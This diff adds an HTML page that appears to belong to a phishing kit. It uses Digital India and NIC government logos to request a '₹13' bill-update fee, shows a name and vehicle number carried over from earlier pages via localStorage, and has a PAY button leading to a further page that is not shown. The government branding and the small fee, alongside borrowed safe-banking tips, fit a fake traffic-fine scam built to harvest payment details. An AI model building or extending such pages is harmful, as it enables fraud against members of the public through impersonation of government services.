@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Bill Update</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f0f2f5;
+    }
+
+    .card {
+      max-width: 100%;
+      width: 92%;
+      background-color: #ffffff;
+      margin: 30px auto;
+      border-radius: 15px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.08);
+    }
+
+    .logos {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .logos img {
+      height: 40px;
+      max-width: 48%;
+      object-fit: contain;
+    }
+
+    h3 {
+      font-size: 18px;
+      color: #111;
+      margin-top: 20px;
+      margin-bottom: 8px;
+    }
+
+    .amount {
+      font-size: 22px;
+      font-weight: bold;
+      color: #000;
+      margin-bottom: 10px;
+    }
+
+    .info-display {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+
+    .pay-button {
+      background-color: #d00000;
+      color: white;
+      border: none;
+      padding: 14px;
+      width: 100%;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      margin-top: 15px;
+    }
+
+    .pay-button:hover {
+      background-color: #b10000;
+    }
+
+    .tips {
+      text-align: left;
+      margin-top: 25px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .tips h4 {
+      margin-bottom: 10px;
+    }
+
+    .tips ul {
+      padding-left: 20px;
+      margin: 0;
+    }
+
+    .tips li {
+      margin-bottom: 8px;
+      line-height: 1.5;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+      margin-top: 30px;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 16px;
+      }
+
+      .logos img {
+        height: 35px;
+      }
+
+      .amount {
+        font-size: 20px;
+      }
+
+      .pay-button {
+        font-size: 16px;
+        padding: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <div class="logos">
+      <img src="https://upload.wikimedia.org/wikipedia/en/thumb/9/95/Digital_India_logo.svg/1200px-Digital_India_logo.svg.png" alt="Digital India">
+      <img src="https://www.presentations.gov.in/wp-content/uploads/2020/06/NIC_Preview-1.png" alt="NIC">
+    </div>
+
+    <h3>Bill Update Fees</h3>
+    <div class="amount"><span style="background-color:red; border-radius:50%; width:10px; height:10px; display:inline-block; margin-right:6px;"></span>₹13/-</div>
+
+    <!-- ✅ Name and Vehicle Number -->
+    <div class="info-display">
+      Name: <strong id="nameDisplay">Loading...</strong><br>
+      Vehicle No: <strong id="vehicleDisplay">Loading...</strong>
+    </div>
+
+    <!-- ✅ PAY button with redirection -->
+    <button class="pay-button" onclick="goToPayment()">PAY</button>
+
+    <div class="tips">
+      <h4><strong>Safe Banking Tips:</strong></h4>
+      <ul>
+        <li>Be cautious of phishing and vishing attempts</li>
+        <li>Avoid sharing account-related information</li>
+        <li>Carefully read terms before proceeding</li>
+      </ul>
+    </div>
+
+    <div class="footer">
+      T&C | Privacy | 60bu4oA8<br>
+      Powered By
+    </div>
+  </div>
+
+  <!-- ✅ Script to load name and vehicle number from localStorage -->
+  <script>
+    const name = localStorage.getItem("fullName");
+    const vehicle = localStorage.getItem("vehicleNumber");
+
+    document.getElementById("nameDisplay").textContent = name || "Not found";
+    document.getElementById("vehicleDisplay").textContent = vehicle || "Not found";
+
+    // ✅ Redirect to payment options
+    function goToPayment() {
+      window.location.href = "3rd.html"; // Replace with your actual file name
+    }
+  </script>
+
+</body>
+</html>
